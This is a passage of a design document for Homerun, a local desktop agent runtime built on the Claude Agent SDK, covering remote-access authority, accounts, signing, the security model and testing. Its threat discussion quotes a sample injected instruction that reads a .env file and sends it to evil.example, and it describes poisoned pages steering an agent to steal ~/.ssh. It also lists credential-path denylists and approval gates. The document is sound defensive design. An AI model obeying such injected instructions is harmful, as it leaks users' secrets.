*could* serve modified JavaScript that steals the keys or the plaintext. This
weakens the blind-relay guarantee for web sessions specifically, and there is no
complete fix. Mitigation is **reduced authority**:

- The web client can read history, chat, answer questions (§5.6), and approve
  `read`-class tool calls.
- `write` and `destructive` approvals require the desktop or iOS app, where the
  code is signed.

**Limiting approvals is not enough, because chat is also an instruction
channel.** A modified web bundle does not need to approve anything: it can type
*"read ~/Code/site/.env and fetch https://evil.example/?d=…"*, and any tool
already on the task's allowlist would run. So authority attaches to **where a
run's instructions came from**, not only to who approves.

**Rule: a run started or steered from the web is read-only.**

- Each run records an `authority`: `full` or `web_read_only`.
- A run is `web_read_only` if the web client started it, or sent it any message
  while it was running. Once downgraded, a run stays downgraded until it ends.
- In a `web_read_only` run, the task's allowlist is narrowed to `read`-class
  tools. Every `write`, `destructive`, or `Bash` call, and any network request to
  a domain outside the task's egress allowlist, becomes an approval request.
  **Only desktop or iOS can answer it.** The web client sees *"Approve on your
  phone or Mac"*.
- A new message from desktop or iOS starts a new run with `full` authority. A
  web message never raises authority.
- Enforced in the runtime's `PreToolUse` hook (§13), which runs on every tool
  call whatever the SDK permission mode. The origin comes from the
  authenticated device that sent the message (§10.5), not from anything in the
  message content.

This is the only per-surface difference in authority. **iOS and desktop have full
authority**, because they only run signed code: a compromised server cannot
change their behaviour.

The policy is a desktop setting. It can be relaxed only on the desktop itself,
never from the web or the server.

---

## 10. Accounts

### 10.1 Why accounts, and what they are for

The app is distributed to other users, so identity is needed for:

- **Relay authorization and abuse control.** An anonymous relay is an open
  message bus. Per-account rate limits, quotas, and bans are what make it safe
  to operate in public.
- **Seeing all your desktops from the phone.** A user with a Mac and a PC links
  both to one account and controls each from iOS (§10.6).
- **Recovery and revocation.** Sign in on a replacement phone and relink;
  unlink a lost one from anywhere.
- **A foundation for v2** — billing, managed model credits, teams.

### 10.2 What accounts are *not*

This boundary is the whole design, and it is what keeps accounts cheap:

- **Not a data store.** Tasks, runs, prompts, results, and credentials stay on
  the desktop. The server never holds them, encrypted or otherwise.
- **Not a key authority.** The server never holds the keys that encrypt device
  traffic, and cannot on its own make a device trusted (§10.5).
- **Not required to use the product locally.** The runtime, CLI, and desktop UI
  all work signed out (§10.10). Only remote access needs an account.

An account is an identity, a list of devices, and permission to use the relay.
Nothing else.

### 10.3 Identity provider

**Use a managed, standards-based OIDC provider. Do not build auth.** Password
storage, MFA, email verification, breach handling, and brute-force protection
are a security product in their own right, and not the one we are building.

Requirements:

1. Standard OAuth 2.0 / OIDC with PKCE, so desktop, iOS, and relay treat it
   generically — and the provider stays swappable.
2. Hosted login UI supporting email, Google, and **Sign in with Apple**.
3. JWKS-verifiable JWTs, so the relay can verify tokens at the edge with no
   callback to the provider.
4. Native iOS (`ASWebAuthenticationSession`) and desktop (system browser +
   loopback redirect) flows.
5. A path to organizations and enterprise SSO for a later teams product.

| Option | Notes |
|---|---|
| **WorkOS AuthKit** | **Recommended.** Standards-first OIDC, hosted UI, and the strongest path to enterprise SSO later. |
| Clerk | Best React / Expo developer experience; slightly more proprietary surface. |
| Auth0 | Mature and complete; heavier and pricier at scale. |
| Better Auth (self-hosted) | TypeScript, runs on Workers + D1, no vendor — but we own the security. |

Because requirement 1 is standard OIDC, switching providers later is a
configuration change plus a user migration, not a rewrite.

### 10.4 Sign-in flows

- **Desktop:** the *runtime* (not the UI) runs Authorization Code + PKCE through
  the **system browser** with a loopback redirect (RFC 8252). The runtime keeps
  the refresh token in memory; the **shell** persists it in the keychain (§11)
  and restores it with `secrets.set` at every launch. Remote access keeps
  working with the window closed, because the shell stays running in the tray.
  When the provider rotates the refresh token, the runtime writes the new one
  back with `secrets.persist`. If the shell is not connected at that moment,
  the §5.2 rules apply: hold it in memory and retry on reconnect, and fall back
  to a fresh sign-in if the runtime restarts first.
- **iOS:** `ASWebAuthenticationSession` + PKCE; tokens in the iOS Keychain.
- **Relay:** verifies short-lived access tokens against the provider's JWKS on
  connect. No session state on our side.

Embedded webviews are **not** used for login: they are phishing-shaped and
several providers block them.

### 10.5 Device linking — the part that must be right

Accounts introduce a subtle risk. If the server tells the phone "here is your
desktop's public key," a compromised or malicious server could hand over *its
own* key instead and sit in the middle — silently undoing the end-to-end
encryption from §9.4.

**Rule: the account proves who you are. Only an already-trusted device can
vouch for a new device's key.**

Linking a phone to a desktop:

1. Phone signs in and sees the desktops registered to the account.
2. User taps a desktop. Phone and desktop exchange public keys via the relay.
3. **Both screens show the same short code** (e.g. `4821`), derived from a hash
   of both public keys.
4. User confirms on the desktop that the codes match.
5. Desktop signs the phone's key, and both sides pin each other.

A server substituting a key produces mismatched codes. The server can refuse to
connect devices, but it cannot forge trust. QR-code pairing (§9.6) remains
available and skips the code comparison, because the QR itself carries the key.

Desktop-to-account registration needs no comparison: it happens on the desktop
itself, where the key lives.

### 10.6 Multiple desktops, cheaply

With an account, the phone lists every linked desktop and controls each
independently. This is **not** multi-device sync: each desktop still owns its own
tasks (§3.3). It is the most useful multi-device behaviour at almost none of the
cost, because no data is shared between desktops.

### 10.7 What the server stores

| Table | Contents |
|---|---|
| `accounts` | account id, email, created at, deletion state |
| `devices` | device id, account id, public key, platform, display name, last seen |
| `device_links` | which device vouched for which, with the signature |
| `push_tokens` | APNs token per iOS device |

No task, run, prompt, or tool data — plaintext or ciphertext. This is also what
makes the compliance burden (§10.9) small.

### 10.8 Recovery

- **Lost phone:** unlink it from the desktop or the web account page; sign in on
  the new phone and relink. Nothing is lost.
- **Lost desktop:** the account survives, but that desktop's tasks and history
  are gone — they only ever lived there. This is the honest cost of local-first.
  Encrypted backup is deferred (§15).

### 10.9 Obligations that come with accounts

Unavoidable once we ship accounts to the public — and all small because the
server holds so little:

- **In-app account deletion** — required by App Store guidelines when an app
  offers account creation.
- **Sign in with Apple** — effectively required on iOS when third-party social
  login is offered.
- Privacy policy, terms of service, and data export and deletion on request
  (GDPR / CCPA).

### 10.10 Signed-out mode

| Capability | Signed out | Signed in |
|---|---|---|
| Run agents, schedules, tools locally | ✅ | ✅ |
| Desktop UI and CLI | ✅ | ✅ |
| iOS and web access (via the relay) | — | ✅ |
| Push notifications | — | ✅ |
| Multiple desktops on one phone | — | ✅ |

The relay only accepts account-authenticated connections, which leaves exactly
one authorization path to secure. Crucially, **milestones 1–8 have no dependency
on accounts at all.**

### 10.11 Deferred to v2

These carry the real complexity, and are what "accounts" usually secretly means:

- **Managed model billing** — selling credits instead of BYO key. Reintroduces a
  model proxy, metering, fraud, and provider resale terms.
- **Task sync across desktops.**
- **Encrypted cloud backup** of the desktop database.
- **Teams and organizations.**

---

## 11. Distribution

What it takes to put this in other people's hands.

**macOS**
- Developer ID signing, hardened runtime, and **notarization** — otherwise
  Gatekeeper blocks launch.
- Register **the app itself** as a login item with `SMAppService.mainApp`
  (macOS 13+). It appears under System Settings → Login Items as Homerun, where
  users expect to control it. No helper or LaunchAgent is installed.
- Guide the user through granting Full Disk Access and Automation only when a
  task actually needs them, never upfront.
- **Signing is inside-out, by our own script,** because Tauri's bundler cannot
  set per-helper entitlements. It is a hybrid:
  - The shell and the runtime are signed with our Developer ID.
  - **`claude` keeps Anthropic's Developer ID signature, unmodified.** The build
    checks that it still meets Anthropic's designated requirement and is
    hardened, instead of re-signing it. Its signature already includes
    `allow-jit`. It also carries entitlements we did not choose
    (`allow-unsigned-executable-memory`, `disable-library-validation`, Apple
    Events, audio input). The shell needs the matching usage strings only if
    `claude` ever uses those.
  - The Node and `uv` components (§5.5) are re-signed with our Developer ID.
    Node's vendor signature carries `get-task-allow`, which blocks
    notarization.
  - **Still to prove with our certificate:** that the notary service accepts
    nested code signed by another team's Developer ID. It should, because
    `claude` is hardened and timestamped. If it does not, re-sign `claude`
    too, after confirming with Anthropic (§3.4).
- **Three signed executables in the bundle** (shell, runtime, `claude`) and two
  in on-demand components (Node, `uv`), all under the hardened runtime, each
  with the fewest entitlements that work:

  | Binary | Entitlements |
  |---|---|
  | Shell | `keychain-access-groups` only (below) |
  | Runtime (Bun) | `allow-jit` |
  | `claude` (Bun) | Anthropic's, which include `allow-jit`. Without it every turn fails |
  | Node | `allow-jit`, `disable-library-validation` (native add-ons from npm) |
  | `uv` | none |

  `allow-unsigned-executable-memory` is not needed by Bun 1.4.2 or later, or by
  Node 24.
- **The shell owns the keychain.** `keychain-access-groups` is restricted under
  Developer ID and needs an embedded provisioning profile, which a bare Mach-O
  such as the runtime cannot carry.
  - The shell, the bundle's main executable, carries the app's
    `embedded.provisionprofile` and the `keychain-access-groups` entitlement.
    Items live in the data-protection keychain, in a shared access group tied
    to our Team ID rather than to one binary's code signature. Otherwise an
    update that changes a signature prompts *"Homerun wants to access your
    keychain"*.
  - The runtime never calls Security.framework. The shell hands it secrets over
    the authenticated channel (`secrets.set`, §5.2), and stores the ones the
    runtime creates or rotates (`secrets.persist`).
  - **Keychain reads never block.** A read from the legacy keychain can show a
    modal dialog and block the calling thread, even when told not to. The shell
    reads off the main thread with a timeout, and on timeout shows *"Keychain
    access needs your approval"*.
  - **Fallback** if the access group cannot be set up: with a Developer ID
    build, the legacy keychain's `teamid:` partition should still prevent the
    prompt after an update. The update test (§16.1 item 8) runs in CI for every
    release.
- **Release pipeline facts.** Tauri refuses to start if its executable path
  contains a symlink (for example `/tmp`, which links to `/private/tmp`). A
  crash during launch leaves AppKit's *"reopen windows?"* alert, which blocks
  the next unattended launch, so test harnesses clear
  `~/Library/Saved Application State/dev.homerun.app.savedState`.

**Branding (all platforms):** "Homerun, powered by Claude" is allowed. "Claude
Code", and visuals imitating it, are not (§3.4).

**Windows**
- Authenticode code signing (Azure Trusted Signing or an EV certificate) — an
  unsigned installer triggers SmartScreen warnings that most users will not
  click through. An EV certificate no longer grants instant SmartScreen
  reputation: expect warnings for early downloads until reputation builds, and
  say so on the download page.
- NSIS or MSI installer via Tauri's bundler; per-user install, so no admin
  prompt is needed. Start at login via a per-user startup entry, toggleable in
  settings.

**iOS**
- App Store distribution. **App Review needs to see a working desktop**: ship a
  demo mode and provide a hosted demo desktop in review notes, or expect a
  rejection for "app requires hardware or software not provided."
- The hosted demo desktop is a small, always-on `homerund` that we operate:
  a demo account, read-only tools, a spend cap, and reset nightly. Budget for
  it as real infrastructure.

**Updates and control**
- Stable and beta channels, staged rollout.
- **Minimum-version gate and remote kill switch**, served by our backend. The
  relay makes this cheap now that it exists — and for software that takes
  unattended actions on users' machines, the ability to stop a bad version is
  mandatory. Rollbacks stay within the schema rollback window (§6.3).

**Diagnostics**
- Opt-in crash reporting (e.g. Sentry) with strict scrubbing. **Never send
  prompts, tool inputs, or tool outputs.**
- A user-initiated, redacted diagnostic bundle for support cases.

---

## 12. Device identity — why `device_id` survives

If a task is created on a device and only ever runs on that device, why carry a
device identifier at all?

Device pinning is itself a statement about *which* device, so it needs a way to
name one. The concrete reasons:

1. **iOS pairing requires stable identity.** The phone must know it is talking to
   the *same* desktop it paired with; certificate pinning is keyed to it. This is
   needed with exactly one desktop.
2. **Machine migration.** A user restores a new Mac from Time Machine. The
   database arrives with tasks whose local paths may not exist and whose keychain
   references are stale. Comparing the stored `device_id` against the install
   detects this and prompts, instead of silently running broken tasks.
3. **Run attribution.** The moment a second machine exists, "which machine ran
   this?" is unanswerable retroactively. It cannot be backfilled.

**What this design deliberately omits:** leases, lease expiry, fencing tokens, presence tiers,
capability-based placement, and scoring-based election. All of that existed to
serve multi-device arbitration, which this design no longer does. On a single
device, a **single-instance lock** (§5.1) is the correct and far simpler
mechanism.

`device_id` is just a UUID in a table. It costs one row.

**One device per OS user, not per machine.** On a Mac shared by two accounts,
each OS user has their own Homerun: their own runtime, database, keychain items,
`device_id`, and socket. They never see each other's tasks.

---

## 13. Security model

Local execution puts the agent **inside the user's trust boundary**, which raises
the stakes rather than lowering them.

**Primary threat: prompt injection.** Web pages, emails, and files pulled into
context can attempt to steer tool use — and the blast radius is the user's actual
machine. A poisoned page trying to read `~/.ssh` and POST it somewhere is the
canonical attack.

Defence in depth (and it should be described as exactly that — **this is not a
true sandbox**):

- **Path scoping.** Filesystem and shell tools are restricted to declared roots.
  Hard denylist regardless of scope: `~/.ssh`, keychain paths, browser profile
  directories, `.env` and credential files.
- **Tool classification + approval gates** (§5.5). `destructive` tools are
  never auto-approved inside an unattended run. A scheduled run that wants to
  delete something pauses and notifies.
- **Untrusted third-party tools.** MCP tools require approval until trusted, and
  their annotations can only tighten classification (§5.5).
- **`Bash` treated as destructive**, except exact allowlisted command patterns
  with no shell metacharacters. Monitors have no `Bash` at all (§5.5).
- **Taint rule + egress allowlist.** Once a run has read untrusted content,
  every request to a domain outside the task's allowlist needs approval. This
  directly limits exfiltration even if injection succeeds. Open egress is
  allowed only for tasks with no private data (§5.5).
- **Untrusted-content framing.** Tool results are structurally marked as data,
  never merged into the instruction channel of the prompt.
- **Stronger isolation where available.** Run shell tools inside a container when
  one is present. macOS `sandbox-exec` profiles as an additional layer.
- **Full audit log.** Every tool call's metadata and decision, immutable and
  kept forever, queryable from any surface. Full inputs and outputs are kept for
  the retention window (§6.1).
- **Enforcement through the SDK's layers.** Deny rules for the hard denylist,
  and `PreToolUse` hooks for Homerun's policy (classification, taint, web-origin
  authority). Hooks run before every call, whatever the permission mode.
  `bypassPermissions` is never used.
- **No inherited configuration.** Runs never load the user's `~/.claude`
  settings, hooks, skills, or MCP servers (§5.3).

**Secondary threat: the remote access path.** Internet reachability means a
compromised relay or a stolen phone becomes a path to a machine that can run
shell commands. Countermeasures:

- **No inbound listener** on the desktop (§9.2) — the relay cannot be used to
  reach the runtime except through an authenticated, end-to-end encrypted session
  the runtime itself established.
- **The relay is blind** — it cannot read or forge frames, because it does not
  hold the keys that authenticate them.
- **Approval is not a remote-code-execution primitive.** A phone can approve a
  tool call the agent already proposed; it cannot inject an arbitrary command
  into a run.
- **Revocation** (§9.6) for a lost or stolen device, plus the OS device passcode
  and Secure Enclave protecting the iOS identity key.

---

## 14. Desktop app and updates

**Shell: Tauri v2.** Far lower memory than Electron and a signed updater built
in. The install is no longer small — the Bun runtime and the bundled `claude`
binary dominate its size — so bundle size is no longer the argument; memory use
and a thin shell are. The usual objection — WKWebView on macOS vs WebView2 on
Windows causing rendering divergence — is weak here because the shell is
genuinely thin: it is a window onto a web app, and the runtime lives in a
separate process (§5.1). If pixel parity or Node-native modules turn out to matter, Electron is a
drop-in swap for the same reason.

**Two-tier updates**, which is what delivers "upgrade easily across three
surfaces":

- **Tier 1 — web assets (~95% of changes).** A bundled baseline for offline cold
  start, plus OTA updates fetched on launch. Fixes reach Mac and Windows in
  minutes with no reinstall and no notarization round-trip.
- **Tier 2 — shell and runtime (rare).** Signed Tauri updater, staged rollout.
  Measured in milestone 0 (arm64, without Node and `uv`): the app is 276 MB on
  disk, the DMG 135 MB, and the update payload 122 MB. `claude` alone is
  208 MB uncompressed and changes with every SDK upgrade, so most tier 2
  updates are dominated by it ([measurements](spike-results.md#measurements)).
  A universal build roughly doubles the binaries and is not yet measured.
- **Toolchain components (Node, `uv`)** update separately from the app (§5.5).
  The update manifest lists component versions, and a component is downloaded
  only if the user has installed it.

**Every over-the-air update is signed, and verified before it runs.** Without
this, OTA updates reintroduce exactly the weakness that §9.9 attributes to the
web client: a compromised CDN or update server could push malicious code to
every desktop and phone.

- Bundles are signed in CI with a key held **offline or in a hardware-backed
  signing service** — never on the CDN, relay, or update server.
- The desktop shell verifies the signature (Ed25519) against a public key
  compiled into the signed shell binary, and refuses unsigned or mismatched
  bundles, falling back to the bundled baseline.
- iOS uses **Expo Updates code signing**, with the verification certificate
  embedded in the App Store binary.
- **App Store rule:** over-the-air updates may change JavaScript and assets but
  must not change the app's primary purpose or add native capabilities. New
  native features always ship as App Store releases.
- Signing-key rotation ships only through a Tier 2 (fully signed, reviewed)
  release.

This is the property that lets desktop and iOS hold `write` and `destructive`
approval authority while the web client does not.

**Compatibility contract.** The web bundle declares a `requiredShellApi` version;
the shell refuses an incompatible bundle and falls back to its baseline. Without
this, tier 1 will eventually ship a bundle calling a native API the installed
shell lacks. The same applies to the UI↔runtime protocol handshake (§5.2).

---

## 15. Deferred

Named explicitly so they are decisions, not omissions:

- Control plane, hosted scheduler, cloud agent execution
- Direct same-network phone connection, on trusted networks only (§9.5)
- Managed model billing (credits instead of BYO key) (§10.11)
- Encrypted cloud backup of the desktop database
- Multi-device sync and election
- **Non-Claude models** (GPT, Gemini, local), via a second agent engine (§7.5)
- **Hosted `homerund`** for web-only users and always-on monitors (§9.9).
  Hosted monitors come first if the coverage data (§8.4) shows laptop users miss
  most fires.
- Waking the machine to run a schedule
- Cross-run agent memory
- Teams, organizations, multi-tenant features

---

## 16. Build plan

Deliberately UI-last: the runtime is the risky part, installers are the boring
part.

| # | Milestone | Exit criteria |
|---|---|---|
| 0 | **Spike: SDK + packaging** | See §16.1. Build first; the design is revised if any item fails |
| 1 | [`packages/core`](../packages/core/README.md) | Task spec, event types, IPC protocol as Zod schemas |
| 2 | `homerund` runtime | Prompt → Agent SDK `query()` → streamed deltas, persisted `thread_events`, isolated from `~/.claude`; replay harness (§16.2) in CI |
| 3 | CLI | Drive the runtime end-to-end with no UI; authenticated socket (§5.2), with a development-mode token until the app exists |
| 4 | **Crash resume** | Kill at every event boundary (§16.2); resume correctly, including ambiguous tool calls |
| 5 | Scheduler + monitors | Cron + timezone + catch-up-on-wake + power assertions; rule-based and model-based checks; state advances only on success; health digest; fake-clock suite including DST and sleep |
| 6 | Approvals + questions | Destructive tool pauses a run; `AskUserQuestion` pauses for an answer; long waits `defer` and resume; answer from CLI; first answer wins |
| 7 | Desktop app | Tauri shell spawns and supervises the runtime; chat, history, questions, approvals |
| 8 | Packaging | Menu-bar / tray residency, login item, signed updater, quit confirmation |
| 9 | Accounts + relay + push | OIDC sign-in on desktop; outbound WSS; Noise live sessions and sealed messages; APNs delivery; protocol test vectors pass on all clients |
| 10 | iOS + web | Sign-in and device linking; history sync, live chat, steering, questions, approvals, rich push; web client with reduced authority |
| 11 | Distribution | Signed and notarized builds, installers, crash reporting, version gate |

**Milestone 2 is the first real slice:** a runtime that takes a prompt, runs a
tool-using loop with an MCP server attached, streams events, persists them, and
survives being killed.

### 16.1 Milestone 0: prove the risky parts first

Every item is a yes/no test on a real, signed build. If any fails, the design is
revised before milestone 1 starts.

**Status after the spike** ([full results](spike-results.md)). Items 1–5 were
run against a scripted mock API and then the real API. The packaging items used
self-signed and ad-hoc builds, because no Developer ID was available. *Blocked*
means the check needs our Apple Developer ID and Team ID to finish. Where an
item failed, the design above has been revised.

**Agent SDK behaviour**
1. A Bun-compiled binary drives the bundled `claude` binary through
   `pathToClaudeCodeExecutable`, with `settingSources: []` and a private
   `CLAUDE_CONFIG_DIR`. Nothing from the developer's own `~/.claude` loads.
   **Passed** (mock and real API), after the isolation additions in §5.3.
   [Evidence](spike-results.md#1-isolation-from-the-developers-claude).
2. A `sessionStore` round trip through SQLite: run, kill the process, resume
   from the store alone. **Passed** (mock and real API).
   [Evidence](spike-results.md#2-sessionstore-round-trip-through-sqlite).
3. `defer` from a `PreToolUse` hook; the process exits; resume hours later with
   the answer. **Passed** for defer, exit and resume (mock and real API),
   after the parallel-call rule in §5.6. The resume after a long gap
   **passed** after 189 minutes (mock API).
   [Evidence](spike-results.md#3-defer-and-resume-later).
4. Kill in the middle of a tool call; resume; the ambiguous call is detected
   and a user decision ("it did / did not happen") is injected (§5.4).
   **Passed** (mock and real API), with the resume procedure revised in §5.4.
   [Evidence](spike-results.md#4-kill-mid-tool-call-detect-the-ambiguous-call-inject-the-users-decision).
5. Steering: a message pushed into streaming input mid-run is seen at the next
   step. **Passed** (mock and real API).
   [Evidence](spike-results.md#5-steering).

**Packaging (macOS)**
6. One app bundle holding the Tauri shell, the Bun runtime, and `claude`, each
   signed under the hardened runtime, with JIT on the runtime, `claude` and
   Node, and library validation off on Node only (§11). The whole bundle
   notarizes, and Gatekeeper launches it on a clean machine. **Failed as
   first written** (`claude` needs JIT too; Node needs library validation
   off), now reworded; the bundle and entitlements pass with ad-hoc signing.
   Notarization and the clean-machine launch are **blocked** on the Developer
   ID. [Evidence](spike-results.md#6-bundle-hardened-runtime-entitlements-notarization-gatekeeper).
7. A Developer ID build reads and writes a keychain item in the shared access
   group, from the shell (§11). **Blocked** on the Team ID and provisioning
   profile. [Evidence](spike-results.md#7-keychain-access-group).
8. A full auto-update cycle to a newly signed Developer ID build: no keychain
   prompt appears, and a run in progress resumes afterwards. **Partial:** the
   update and resume passed; "no keychain prompt" failed with self-signed and
   ad-hoc builds, as expected, and is **blocked** for Developer ID.
   [Evidence](spike-results.md#8-auto-update-mid-run).
9. `SMAppService.mainApp` login item: launches at login, and shows as
   "Homerun" in Login Items. **Partial:** registration and the name passed;
   launch at login is untested (it needs a logout).
   [Evidence](spike-results.md#9-login-item).
10. Homerun's Node runs an `npx` MCP server that has a native add-on (for
    example, one using `better-sqlite3`), and its `uv` runs a `uvx` server,
    both launched by the signed runtime on a clean machine. **Passed on the
    development machine**, from inside the bundle and from the on-demand
    components directory (§5.5). The clean-machine run is scripted but not yet
    run. [Evidence](spike-results.md#10-mcp-servers-via-bundled-node-and-uv).

**Measure and record:** install size (with Node and `uv`), idle memory, and
memory per active run. **Recorded** (arm64,
[details](spike-results.md#measurements)):
- Install size: app 443 MB on disk, DMG 205 MB, update 180 MB with Node and
  `uv`; 276 MB, 135 MB and 122 MB without them (the shipping layout, §5.5).
- Idle memory: runtime 64 MiB RSS; whole app 241 MiB RSS (85 MB footprint).
- Per active run: about 215 MiB RSS (120 MB footprint) with the clean shell
  (§5.3); 260–300 MiB with a user's own shell profile.

### 16.2 Testing strategy

The hardest properties in this design cannot be tested by hand. Four harnesses
are built alongside the milestones that need them, plus one gate on SDK
upgrades.

| Harness | What it proves | How |
|---|---|---|
| **Replay Claude** | Runs behave deterministically in CI, at no API cost | A local server behind `ANTHROPIC_BASE_URL` that records real API exchanges once and replays them. Scenarios: tool loops, approvals, questions, errors, rate limits |
| **Crash at every boundary** | Crash resume is correct, not just usually correct | Run a scripted scenario; kill the runtime (and separately the `claude` process) after event *k*, for every *k*; resume; assert on the final state. Invariants: no duplicate side effects from non-idempotent tools, no lost messages, `seq` has no gaps, and ambiguous calls always ask the user |
| **Fake clock** | Scheduling is correct across time | An injected clock and injected sleep and wake events. Cases: DST gaps and overlaps, timezone changes, week-long sleep, every catch-up policy, `UNIQUE(dedupe_key)` under a race between catch-up and a normal fire |
| **Protocol test vectors** | Desktop, iOS, and web interoperate | Shared files of known keys, messages, and expected ciphertext, for Noise live sessions, sealed messages, expiry, and replay rejection. The TypeScript runtime and the React Native client must both pass the same files |

**SDK upgrade gate (eval suite).** Because the SDK tracks Claude Code, an
upgrade can change agent behaviour without any change to our code.

- The SDK version is pinned exactly.
- An upgrade merges only after a small eval suite passes against the **live**
  API: 20–30 representative tasks, covering sessions, monitors, approvals, the
  tool policy (§5.5), and settings isolation (§5.3).
- The suite checks outcomes and policy (for example, "the tainted run asked
  before fetching an unknown domain"), not exact wording.
- It also covers SDK behaviour that milestone 0 found to be undocumented or
  internal, and that Homerun depends on:
  - **Injected tool results:** the format of the `tool_result` entry appended
    to `sdk_transcripts` for an ambiguous call (§5.4) still resumes cleanly,
    and the model does not re-run the call. Truncation with `resumeSessionAt`
    still works as the fallback.
  - **Stateful sibling denial:** `PreToolUse` still fires once per call as each
    call of a parallel batch streams. Deferring the first gated call and
    denying the rest still leaves one input request, and the model re-issues
    the denied calls after the answer (§5.6).
  - **Background tasks stay off:** with
    `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1`, neither the model nor `claude`
    can move a `Bash` command to the background (§5.3).
  - **Resume quirks:** `claude` still answers a dangling tool call as
    "interrupted" on resume, and the stored decision for a deferred call is
    still applied when `PreToolUse` is skipped on resume.
  - **Isolation:** the negative control still loads the user's settings, and
    the isolated run still loads none of them (§5.3); the tool shell is still
    the clean `/bin/bash`.
- Cadence: monthly, or immediately for security fixes.
These set the concurrency defaults (§5.3).

---

## 17. Open questions

1. ~~Product name~~ — **Homerun** (runtime `homerund`, CLI `homerun`). Repository
   location still open.
2. **Windows parity timing** — build both from milestone 1, or macOS first and
   port at milestone 7? The runtime is portable; the packaging is not.
3. **Browser tooling** — bundle Playwright (heavy, reliable, own browser) or
   drive the user's existing Chrome via CDP (light, reuses logged-in sessions,
   more fragile)? This materially affects what monitors can do.
4. ~~Does the web client exist standalone?~~ — **Resolved:** remote control in
   v1, hosted `homerund` in v2 (§9.9).
5. ~~Monitor state~~ — **Resolved:** explicit saved state, rule-based or
   model-based checks, quiet threads, daily health digest (§8.3).
6. **Relay hosting.** Cloudflare Workers + Durable Objects (recommended) vs a
   small Node service. Decide before milestone 9; it does not block 1–8.
7. **Identity provider** — WorkOS AuthKit (recommended), Clerk, Auth0, or
   self-hosted Better Auth. Decide before milestone 9.
8. ~~Agent SDK upgrade policy~~ — **Resolved:** pinned version, monthly
   upgrades gated by an eval suite (§16.2).
9. **Business model.** Users bring their own Anthropic key, so v1 earns nothing,
   while the relay, push, identity, and the App Review demo desktop all cost
   money. Options: a paid desktop licence, a subscription for remote access, or
   managed model credits (§10.11). Not a v1 blocker, but decide before public
   launch.
